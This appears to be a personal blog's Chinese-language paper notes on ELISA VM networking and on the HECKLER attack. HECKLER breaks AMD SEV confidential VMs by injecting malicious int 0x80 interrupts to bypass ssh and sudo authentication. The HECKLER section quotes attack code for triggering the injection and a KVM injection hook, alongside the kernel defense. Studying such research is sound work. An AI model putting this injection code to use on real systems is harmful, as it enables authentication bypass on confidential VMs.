<p>gate隔离开def和sub 加简单的check就可以</p>
<h2 id="network"><a href="#network" class="headerlink" title="network"></a>network</h2><p>VM-&gt;虚拟网卡-&gt;qemu&#x2F;kvm-&gt;内核网桥-&gt;物理网卡</p>
<p>[KVM 介绍（4）：I&#x2F;O 设备直接分配和 SR-IOV <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sammyliu/p/4548194.html">KVM PCI&#x2F;PCIe Pass-Through SR-IOV] - SammyLiu - 博客园 (cnblogs.com)</a></p>
<p>PCI passthrough 设备直通 一个网卡给一个虚拟机用</p>
<p>SRIOV也是设备直通 但是有一个网卡给多个虚拟机用的能力</p>
<p>virtual switch是sub context共享的 物理NIC的IO buffer和DMA是sub context共享的</p>
<p>vNIC的io buffer是def和sub共享的</p>
<p>virtual switch用了VALE&#x2F;mswitch netmap</p>
<p>VNIC driver是DPDK写的  user application也要用DPDK去通信</p>
<p>发包</p>
<ol>
<li>vNIC把数据放到IObuffer def和sub shared</li>
<li>vmfunc</li>
<li>virtual switch拷贝到目标NIC</li>
<li>virtual switch trigger sub中的physical NIC driver</li>
</ol>
<p>收包</p>
<ol>
<li>vNIC</li>
<li>vmfunc 进入sub</li>
<li>virtual switch拷贝到vNIC</li>
</ol>
<p>PCI passthrough不能被多个VM共用</p>
<p>转发逻辑完全可编程 和SRIOV不同 后者是硬件代码</p>
<p>测试用的benchmark都需要基于DPDK的用户进程</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fengfengdiandia/article/details/52869290">netmap 介绍-CSDN博客</a></p>
<p>网络包首发框架 映射网卡packet buffer到用户态</p>
<p><a target="_blank" rel="noopener" href="https://conferences.sigcomm.org/sigcomm/2017/files/tutorial-netmap/03-vale.pdf">03-vale.pdf (sigcomm.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://manpages.org/vale/4">man vale (4): a very fast Virtual Local Ethernet using the netmap API (manpages.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/ELISA?tab=readme-ov-file#section-71--vm-networking-system">yasukata&#x2F;ELISA: ELISA: Exit-Less, Isolated, and Shared Access for Virtual Machines (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-app-vmnet/blob/master/client/main.c">elisa-app-vmnet&#x2F;client&#x2F;main.c at master · yasukata&#x2F;elisa-app-vmnet (github.com)</a></p>
<ol>
<li><p>guestVM网络请求 被DPDK driver处理<a target="_blank" rel="noopener" href="https://github.com/yasukata/librte_pmd_rvif/blob/9fbd375484cef415ea61bb6b436d509dca707c87/main.c#L276-L278">librte_pmd_rvif&#x2F;main.c at 9fbd375484cef415ea61bb6b436d509dca707c87 · yasukata&#x2F;librte_pmd_rvif (github.com)</a></p>
</li>
<li><p>先拷贝数据到vNIC iobuf上 这个是def sub共享的</p>
</li>
<li><p>然后调用dpdk_rvif_io_hook<a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-app-vmnet/blob/4a9800ea488aa4ac9b057c3d98f04da35faefab1/client/main.c">elisa-app-vmnet&#x2F;client&#x2F;main.c at 4a9800ea488aa4ac9b057c3d98f04da35faefab1 · yasukata&#x2F;elisa-app-vmnet (github.com)</a> 其中do_io会调用elisa_gate_entry</p>
</li>
<li><p>触发vmfunc</p>
</li>
<li><p>进入sub的entry point 这里entry_function是rvs_fwd</p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-app-vmnet/blob/4a9800ea488aa4ac9b057c3d98f04da35faefab1/server/lib/libelisa-applib-vmnet/main.c#L68">elisa-app-vmnet&#x2F;server&#x2F;lib&#x2F;libelisa-applib-vmnet&#x2F;main.c at 4a9800ea488aa4ac9b057c3d98f04da35faefab1 · yasukata&#x2F;elisa-app-vmnet (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/rvs/blob/master/rvs.c">rvs&#x2F;rvs.c at master · yasukata&#x2F;rvs (github.com)</a></p>
<p>rvs是单独实现的一个virtual switch</p>
</li>
<li><p>virtual switch主要做两件事</p>
<ul>
<li>找destination</li>
<li>拷贝数据到destination NIC的IO buffer</li>
</ul>
<p>这部分参考VALE&#x2F;mswitch实现</p>
</li>
</ol>
<h3 id="VALE"><a href="#VALE" class="headerlink" title="VALE"></a>VALE</h3><p>就是一个高性能的virtual switch</p>
<h3 id="hyperNF"><a href="#hyperNF" class="headerlink" title="hyperNF"></a>hyperNF</h3><ul>
<li>为了不增加hypervisor的TCB 把基于VALE的vswitch放在一个privilege VM中 实现转发逻辑</li>
<li>数据和代码export到hypervisor中</li>
<li>map一些数据结构给VM</li>
<li>NIC直接连接switch</li>
</ul>
<p>transmit</p>
<ol>
<li>VM 放数据到packet buffer</li>
<li>hypercall</li>
<li>VALE转发逻辑（查询dest地址 拷贝数据）</li>
<li>hypercall return</li>
</ol>
<ul>
<li>virtio&#x2F;vhost-net是通过hypervisor处理 物理NIC连的是hypervisor上的tap设备</li>
<li>elisa通过hyperNF的架构 多个VM共享物理NIC的DMA区域 例如加锁使用</li>
</ul>
<p>VALE本身就比tap快10-20倍 12年</p>
<p>hyperNF用了VALE 15年</p>
<p>发网络包的过程</p>
<ol>
<li>guest host通信</li>
<li>switch转发</li>
</ol>
<p>elisa做到的是把通信部分从vm exit变为开销更小的vmfunc 并且用自己实现的高效转发逻辑用sub EPT保护起来 同时实现了隔离性</p>
<p>baseline：</p>
<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221141207415.png" alt="image-20240221141207415" style="zoom:50%;" />



<p>elisa</p>
<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221141230092.png" alt="image-20240221141230092" style="zoom:50%;" />



<h2 id="libelisa"><a href="#libelisa" class="headerlink" title="libelisa"></a>libelisa</h2><p>最终执行流也是通过EPT映射决定的 所以如何构造EPT很关键</p>
<p>managerVM配置好EPT以后写到eptp_list 通过hypercall告诉kvm  kvm通过写vmcs配置eptp_list 然后vmfunc就可以直接用</p>
<p>elisa-util-exec会直接执行elisa__exec_init managerVM和guestVM都需要执行elisa-util-exec 这样都执行了shared的mmap</p>
<p>每个需要共享内存的guest VM作为elisa_client</p>
<ul>
<li><h4 id="elisa-server-运行在managerVM-死循环"><a href="#elisa-server-运行在managerVM-死循环" class="headerlink" title="elisa_server  运行在managerVM 死循环"></a><a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-util-exec/blob/eb8a14a132fe7f9b0e7980c7a4ab3a30ef8a465f/main.c#L67"><code>elisa_server</code></a>  运行在managerVM 死循环</h4><p>由elisa-util-exec调用到elisa_server 传入elisa__server_cb  elisa__server_exit_cb</p>
<p>fork后执行server_work</p>
<p>ELISA_APPLIB_FILE&#x3D;.&#x2F;lib&#x2F;libelisa-applib-nop&#x2F;lib.so 这个文件里面只有一个entry_function</p>
<p>server_cb(elisa__server_cb)调用elisa_create_program_map_req 解析ELF把entry_function的代码段都放到base_gpa后的一页一页</p>
<p>shared_memory的指针会被放到代码段页之后的一页</p>
<p>BASE_GPA是1&lt;&lt;37 即128G</p>
<p>正常来说8G内存范围就是0-8G 超了访问硬件就会报错<br>但是对于虚拟化 有GPA-&gt;HPA翻译 超出的部分也可以被映射到合法的HPA<br>default EPT不映射超出的部分 non-default EPT映射超出的GPA到HPA</p>
<p>src_gxa表示可能是gva也可能是gpa 实际上都是gva</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(*map_req)[*map_req_cnt].dst_gpa = <span class="number">0x1000</span> * *map_req_cnt + base_gpa;</span><br><span class="line">(*map_req)[*map_req_cnt].dst_gva = (phdr.p_vaddr &amp; (~((<span class="number">1UL</span> &lt;&lt; <span class="number">12</span>) - <span class="number">1</span>))) + <span class="number">0x1000</span> * j;</span><br><span class="line">(*map_req)[*map_req_cnt].src_gxa = (phdr.p_vaddr &amp; (~((<span class="number">1UL</span> &lt;&lt; <span class="number">12</span>) - <span class="number">1</span>))) + <span class="number">0x1000</span> * j;</span><br></pre></td></tr></table></figure>

<p>server libelisa这边的BASE_GPA是256G</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__map_req[i].dst_gva = requested_gva + 0x1000 * i;</span><br><span class="line">__map_req[i].dst_gpa = BASE_GPA + 0x1000 * i;</span><br></pre></td></tr></table></figure>

<p><code>embed_addr_to_code((void *)((uintptr_t) __RUNTIME_VALUE_2 + 2), entry_function);</code></p>
<p>把entry_function的地址写到sub_context的code中</p>
<p>setup_vcpu_ept_ctx</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assert(!gva2hpa(req[i].src_gxa, &amp;hpa));</span><br><span class="line">pt_map(&amp;ctx-&gt;pt, req[i].dst_gva, req[i].dst_gpa, req[i].pt_flags, req[i].level);</span><br><span class="line">pt_map(&amp;ctx-&gt;ept, req[i].dst_gpa, hpa, req[i].ept_flags, req[i].level);</span><br></pre></td></tr></table></figure>

<p>原先src_gva-&gt;hpa 是src_gva是已经存在的一块内存区域</p>
<p>之后dst_gva-&gt;dst_gpa-&gt;hpa 即用新的guest page table和ept 可以用dst_gva访问到这块数据</p>
<p>pt_map补全页表 建立映射 pgtbl-&gt;cnt表示四级页表中所有页表的个数 pg[0]表示root页表</p>
<p>把pt页表的映射再加到EPT中</p>
<p>只是配好了一个pt和一个ept 包括gate sub用到的代码和stack</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span> *) ctx-&gt;apt_mem, (<span class="type">void</span> *) ctx-&gt;pt.pg[<span class="number">0</span>].va, <span class="number">0x1000</span>);</span><br><span class="line">assert(!gva2hpa((<span class="type">uint64_t</span>) ctx-&gt;apt_mem, &amp;hpa));</span><br><span class="line">pt_map(&amp;ctx-&gt;ept, ((<span class="type">uint64_t</span>) <span class="number">-1</span>) &amp; EPT_ADDR_MASK, hpa, EPT_R | EPT_W | <span class="comment">/*EPT_X | EPT_U |*/</span> EPT_MT, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<p>ept把0xfffffffff映射到apt_mem的hpa 这样ept四级页表都会有最后一项</p>
<p>ae是所有页表的最后一个位置</p>
<p>遍历ept 把512项的每一项都指向ae 即下一级页表的最后一个位置 这样最终会指向apt_mem的hpa 如果已经有指向了 则递归把下一级的指向apt_mem</p>
<p>改变整个地址空间的映射 不是遍历整个地址空间为每个va创建映射 而是直接修改page table entry即可</p>
<p>最终配置完的EPT guest自己所有的GPA都会被映射到apt_mem的HPA  存储的数据是guest page table的root page table</p>
<p>超出范围的GPA被映射到指定的位置  </p>
<p>gate EPT会被放到eptp_list的最后一个位置</p>
<p>set_rendezvous_point_eptp_list_hpa 把eptp_list记录到host</p>
<p>read等待client结束</p>
<p>配置完成后 多了两个ept  并且ept的合法GPA范围都指向了一起配置好的pt</p>
</li>
<li><h4 id="elisa-client-运行在guestVM中-配置完gate-sub-EPT-之后退出"><a href="#elisa-client-运行在guestVM中-配置完gate-sub-EPT-之后退出" class="headerlink" title="elisa_client 运行在guestVM中 配置完gate&#x2F;sub EPT 之后退出"></a><a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-util-exec/blob/eb8a14a132fe7f9b0e7980c7a4ab3a30ef8a465f/main.c#L72"><code>elisa_client</code></a> 运行在guestVM中 配置完gate&#x2F;sub EPT 之后退出</h4><p> 由elisa-util-exec调用到elisa_client 传入client_cb </p>
<p>拿到vcpuid</p>
<p>client_cb 啥也不干</p>
<p><code>request_gva = (uint64_t) gate_entry_page + 0x1000;</code></p>
<p>elisa_guest_activate 写入eptp_list</p>
<p>elisa__client_work 禁止中断 elisa_gate_entry</p>
<p>____asm_impl_client 定义了elisa_gate_entry  执行vmfunc(511) 切换到gate ept</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.src_gxa = (<span class="type">uint64_t</span>) gate_ctx_page,</span><br><span class="line">.dst_gva = requested_gva + <span class="number">0x1000</span> * <span class="number">0</span>,</span><br><span class="line">.dst_gpa = BASE_GPA + <span class="number">0x1000</span> * <span class="number">0</span>,</span><br></pre></td></tr></table></figure>

<p>此使pc正好指向下一个page 这个page通过之前配置好的pt和ept 会被映射到gate_ctx_page</p>
<p>立即切换之后 并不会马上用到stack 因此可以先写一些不需要stack的汇编 然后配置rsp到事先用mmap准备好的栈位置</p>
<p>gate执行完(code page上半部分) vmfunc 切换视角 继续执行的是sub page的下半部分 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;.globl __RUNTIME_VALUE_2 \n\t&quot;</span><br><span class="line">&quot;__RUNTIME_VALUE_2: \n\t&quot;</span><br><span class="line">&quot;movabs $0x123456789abcdef0, %rax \n\t&quot; // 0x123456789abcdef0 (pointer to entry point function) is replaced at initialization</span><br><span class="line">&quot;call *%rax \n\t&quot;</span><br><span class="line">&quot;movq %rax, %rbx \n\t&quot; // save return value on rbx</span><br></pre></td></tr></table></figure>

<p>entry_function中的gva是事先准备好映射的 在shared memory例子中 shm_memory_ptr的gva和src_gva相同 gva不变 通过修改映射访问到host物理内存上的事先用mmap shared准备好的共享内存</p>
<p>entry_function的映射在<a target="_blank" rel="noopener" href="https://github.com/yasukata/libelisa-extra/blob/master/include/libelisa_extra/map.h">libelisa-extra&#x2F;include&#x2F;libelisa_extra&#x2F;map.h at master · yasukata&#x2F;libelisa-extra (github.com)</a>中建立 与shared_memory相同 src_gva&#x3D;dst_gva 不变 dst_gpa一个个往后放</p>
</li>
</ul>
<p>def和sub共享 修改def EPT？ 在启动的时候先让manager VM和guest VM通过qemu提供的共享内存</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/stray2b/article/details/128896078">qemu-kvm Hypervisor：ivshmem-CSDN博客</a></p>
<p>managerVM可以知道共享内存的地址  然后建立和guest sub的共享 达到guest def&lt;&#x3D;&gt;manager def&lt;&#x3D;&gt;guest sub共享的效果</p>
<p>gate_entry_page有三个连续的page</p>
<p>gate_ctx_page和sub_ctx_page共4个连续的page</p>
<p>这些page代码通过VM kernel加载以后 放到host真实的物理内存中</p>
<p>随后通过修改EPT 改变了guest眼中的内存布局(例如物理内存中gate_ctx_page-&gt;eptp_list-&gt;sub_ctx_pape但是GPA视角gate_ctx_page-&gt;eptp_list-&gt;stack)</p>
<p>guest vm 用户态代码<a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-app-nop/blob/master/main.c">elisa-app-nop&#x2F;main.c at master · yasukata&#x2F;elisa-app-nop (github.com)</a> 其中elisa__client_work调用elisa_gate_entry</p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-util-exec/blob/master/main.c">elisa-util-exec&#x2F;main.c at master · yasukata&#x2F;elisa-util-exec (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/libelisa/blob/master/client.c">libelisa&#x2F;client.c at master · yasukata&#x2F;libelisa (github.com)</a> ____asm_impl_client 定义了elisa_gate_entry 用到vmfunc 执行这行以后去哪了？</p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/libelisa/blob/master/server.c#L43">libelisa&#x2F;server.c at master · yasukata&#x2F;libelisa (github.com)</a>对应了论文中gate entry的header</p>
<p>vmfunc理论上是某个page的最后一个指令 因此non-default EPT不会再映射开始的vmfunc这个page</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/06/02/papers/HECKLER/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/06/02/papers/HECKLER/" class="post-title-link" itemprop="url">HECKLER: Breaking Confidential VMs with Malicious Interrupts  </a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-06-02 21:08:42" itemprop="dateCreated datePublished" datetime="2024-06-02T21:08:42+08:00">2024-06-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-02-04 20:53:17" itemprop="dateModified" datetime="2025-02-04T20:53:17+08:00">2025-02-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>2.8k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>10 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><a target="_blank" rel="noopener" href="https://github.com/ahoi-attacks/heckler">ahoi-attacks&#x2F;heckler: Breaking Confidential VMs with Malicious Interrupts (USENIX Security 2024) (github.com)</a></p>
<h1 id="HECKLER-Breaking-Confidential-VMs-with-Malicious-Interrupts"><a href="#HECKLER-Breaking-Confidential-VMs-with-Malicious-Interrupts" class="headerlink" title="HECKLER: Breaking Confidential VMs with Malicious Interrupts"></a>HECKLER: Breaking Confidential VMs with Malicious Interrupts</h1><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>32 使用int 0x80 通过中断实现系统调用</p>
<p>64 syscall指令不通过中断实现</p>
<p><a target="_blank" rel="noopener" href="https://sdww0.github.io/2023/03/09/x86_64-%E4%B8%AD%E6%96%AD-%E5%BC%82%E5%B8%B8%E4%B8%8Esyscall/">x86_64-中断，异常与syscall | sdww0的博客</a></p>
<p><a target="_blank" rel="noopener" href="https://maodanp.github.io/2019/05/26/linux-syscall/">Linux的系统调用 (maodanp.github.io)</a></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>中断有很多种 恶意VMM可以向CVM自由注入虚拟中断</p>
<ul>
<li>SEV 所有虚拟中断都会被成功转发给CVM执行 并且有些是可以转发给用户态自定义的信号处理函数的</li>
<li>TDX 中断号小于31的会被硬件过滤掉（除了NMI）</li>
</ul>
<p>附录Table 6 中断号0x80就是syscall  后续按syscall处理 从eax等寄存器中拿参数 然后eax放返回值 然后返回cvm的pc</p>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>恶意VMM向CVM注入syscall的虚拟中断int 0x80</p>
<p>假如guest 有个gadget是准备eax ecx等参数</p>
<p>恶意VMM注入一个int 0x80 (假设guest准备好的eax是4 buf是共享内存)</p>
<p>那么CVM就会在自己的中断处理函数中把secret写出来</p>
<p>实际上很难找这种gadget 所以只找了 参数和返回值都是仅有eax的  40&#x2F;328</p>
<p>目标是改eax 怎么改？ 利用错误代码  syscall 0表示重启 userspace会报错 这样eax就是-4 可以绕过ssh检查</p>
<p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_32.tbl">linux&#x2F;arch&#x2F;x86&#x2F;entry&#x2F;syscalls&#x2F;syscall_32.tbl at master · torvalds&#x2F;linux (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.onitroad.com/jc/linux/man-pages/linux/man2/restart_syscall.2.html">RESTART_SYSCALL - Linux手册页-之路教程 (onitroad.com)</a></p>
<p>巧合：</p>
<ol>
<li>ssh返回值非零表示通过检查</li>
<li>syscall在报错的时候会返回非零值</li>
</ol>
<p>int 0x0是FPE 例如除0 溢出等 用户自定义处理函数</p>
<p>如果这些处理函数改变了程序某些状态 例如一个变量 那可以被恶意VMM利用</p>
<h2 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h2><p>哪里注入？ 如何判断？</p>
<p>第六章 第七章 附录A</p>
<p>为了定位需要注入攻击的代码页位置 需要提前profile</p>
<ol>
<li>启动阶段记录page 这些page是需要被排除的</li>
<li>尝试很多遍需要攻击的application(例如很多次ssh) 拿到一个固定的page序列</li>
</ol>
<p>通过page fault拿到这个page序列</p>
<p>当ssh验证的时候 访问page的序列是固定的  数第几个是预期的然后插入就行</p>
<ol>
<li>offline phase：离线采样 拿到page序列</li>
<li>online phase：在线采样 找到需要插入中断的位置</li>
<li>inject interrupt：插入中断</li>
</ol>
<p>page序列如何找到两个gadget？</p>
<p>ssh：</p>
<p>sudo：写一个C程序调用PAM module(.so)就可以了 循环访问这两个page</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ahoi-attacks/heckler/blob/master/userspace/sudo/profile_pam.c">heckler&#x2F;userspace&#x2F;sudo&#x2F;profile_pam.c at master · ahoi-attacks&#x2F;heckler (github.com)</a></p>
<p>sudo不需要offline学fapp的过程 只要ssh成功以后用自己跑的程序循环访问 然后看频率最高的两个就可以了</p>
<p>判断GPA相同  要求进程不变 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> mm_answer_authpassword = gadgets[<span class="number">0</span>]</span><br><span class="line"> auth_password = gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sequence of interest:</span></span><br><span class="line"><span class="comment"># mm_answer_authpassword -&gt; auth_password -&gt; mm_answer_authpassword</span></span><br><span class="line"><span class="keyword">if</span> gpa == mm_answer_authpassword \</span><br><span class="line"><span class="keyword">and</span> last_gpa == auth_password \</span><br><span class="line"><span class="keyword">and</span> lastlast_gpa == mm_answer_authpassword:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Injecting interrupt, sequence &quot;</span></span><br><span class="line">    <span class="string">f&quot;\[<span class="subst">&#123;<span class="built_in">hex</span>(lastlast_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(last_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(gpa)&#125;</span>]&quot;</span>)</span><br><span class="line">    h.heckler_inject(<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>

<p>ssh使用sshd</p>
<p>sudo使用一个共享库</p>
<blockquote>
<p>It uses PAM to perform password authentication by calling the pam_unix shared library which has our code gadget from Sec. 5. The Linux kernel executes shared libraries from the same physical addresses.  </p>
</blockquote>
<p>插入中断代码 用的是sev-step提供的框架   通过ioctl 处理 然后kvm_dev_ioctl处理</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ahoi-attacks/heckler/blob/master/userspace/sev-step/sev-step-lib/sev_step_api.c#L241">heckler&#x2F;userspace&#x2F;sev-step&#x2F;sev-step-lib&#x2F;sev_step_api.c at master · ahoi-attacks&#x2F;heckler (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ahoi-attacks/heckler-linux/commit/0aa0129654ddbcdb5043fde1229b710799da2f6f">heckler: introduce nx page fault and track · ahoi-attacks&#x2F;heckler-linux@0aa0129 (github.com)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">heckler_config.do_inject_vector = <span class="number">1</span>;</span><br><span class="line">heckler_config.inject_vector = inj.<span class="built_in">vector</span>;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">heckler_on_svm_vcpu_enter_exit</span><span class="params">(<span class="keyword">struct</span> kvm_vcpu *vcpu)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vcpu_svm</span> *<span class="title">svm</span> =</span> to_svm(vcpu);</span><br><span class="line">    u64 fault_address = svm-&gt;vmcb-&gt;control.exit_info_2;</span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;heckler_config.config_mutex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (heckler_config.do_inject_vector == <span class="number">2</span>) &#123;</span><br><span class="line">        heckler_config.do_inject_vector = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pr_info(<span class="string">&quot;apic clear isr: interrupt: %d\n&quot;</span>,</span><br><span class="line">            heckler_config.inject_vector);</span><br><span class="line"></span><br><span class="line">        kvm_apic_clear_irr(vcpu, heckler_config.inject_vector);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (svm-&gt;vmcb-&gt;control.exit_code == SVM_EXIT_NPF &amp;&amp;</span><br><span class="line">        heckler_config.do_inject_vector == <span class="number">1</span>) &#123;</span><br><span class="line">        heckler_config.do_inject_vector = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        pr_info(<span class="string">&quot;injecting: vector: %d, npf: %llx\n&quot;</span>,</span><br><span class="line">                heckler_config.inject_vector, fault_address);</span><br><span class="line"></span><br><span class="line">        svm-&gt;vmcb-&gt;control.event_inj = heckler_config.inject_vector |</span><br><span class="line">            SVM_EVTINJ_VALID |</span><br><span class="line">            SVM_EVTINJ_TYPE_INTR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutex_unlock(&amp;heckler_config.config_mutex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>run之前插入中断</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">heckler_on_svm_vcpu_enter_exit(vcpu);</span><br><span class="line">svm_vcpu_enter_exit(vcpu);</span><br></pre></td></tr></table></figure>



<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>看上一个pc是不是int 0x80</p>
<p>直接把32位的模拟给禁止了</p>
<p><a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b82a8dbd3d2f4563156f7150c6f2ecab6e960b30">x86&#x2F;coco: Disable 32-bit emulation by default on TDX and SEV - kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git - Linux kernel source tree</a></p>
<p><a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4116bfc44621882556bbf70f5284fbf429a5cf6">x86&#x2F;tdx: Allow 32-bit emulation by default - kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git - Linux kernel source tree</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init idt _setup_traps(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	idt_setup_from_table(idt_table, def_idts, ARRAY_SIZE(def_idts), <span class="literal">true</span>);</span><br><span class="line">	<span class="keyword">if</span> (ia32_enabled())</span><br><span class="line">		idt_setup_from_table(idt_table, ia32_idt, ARRAY_SIZE(ia32_idt), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><a target="_blank" rel="noopener" href="https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf">24593.pdf (amd.com)</a></p>
<p>15.36.16</p>
<p><a target="_blank" rel="noopener" href="https://www.amd.com/en/resources/product-security/bulletin/amd-sb-3008.html">Disrupting AMD SEV-SNP on Linux® With Interrupts</a></p>
<p>认为是软件实现的问题</p>
